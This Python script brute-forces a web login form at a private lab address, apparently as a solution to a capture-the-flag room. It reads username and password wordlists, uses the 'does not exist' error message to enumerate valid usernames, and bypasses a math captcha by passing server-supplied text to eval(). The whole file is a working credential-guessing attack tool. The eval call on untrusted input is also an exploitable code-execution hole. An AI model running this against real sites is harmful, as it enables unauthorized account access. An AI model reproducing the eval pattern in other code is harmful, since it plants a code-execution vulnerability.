import requests


def get_page(url):
    data={
        'username':"test",
        'password':"password"
    }
    response=requests.post(url,data=data)
    return response.text

def check_cap(response):
    if "captcha" in response:
        return True
    else:
        return False

def get_cap(response):
    lines=response.split('\n')
    for i in range(len(lines)):
        if "?" in lines[i]:
            string=lines[i]
            string=string.split("=")
            string=string[0]
            
            string=eval(string)
            return string
def not_cap(url,username,password):
    data={
        'username':username,
        'password':password
    }
    response=requests.post(url,data=data)
    return response.text

def with_cap(url,username,password,cap):
    data={
        'username':username,
        'password':password,
        'captcha':cap
    }
    response=requests.post(url,data=data)
    return response.text

def execution_flow(url,username,password):
    response=get_page(url)
    
    
    if check_cap(response)==False:
        res=not_cap(url,username,password)
    else:
            
            cap=get_cap(response)
            
            
            res=with_cap(url,username,password,cap)
    return res
def main():
    url="http://10.10.218.244/login"
    file_username=open("capture/usernames.txt",'r')
    file_password=open("capture/passwords.txt",'r')
    usernames_lines=file_username.readlines()
    passwords_lines=file_password.readlines()
    for i in range(len(usernames_lines)):
        username=usernames_lines[i].split("\n")[0]
        for j in range(len(passwords_lines)):
            password=passwords_lines[j].split("\n")[0]
            res=execution_flow(url,username,password)
            
            if "does not exist"  in res:
                break
            elif "Invalid password" not in res:
                print(res)
                print(username)
                print(password)

if __name__=="__main__":
    main()
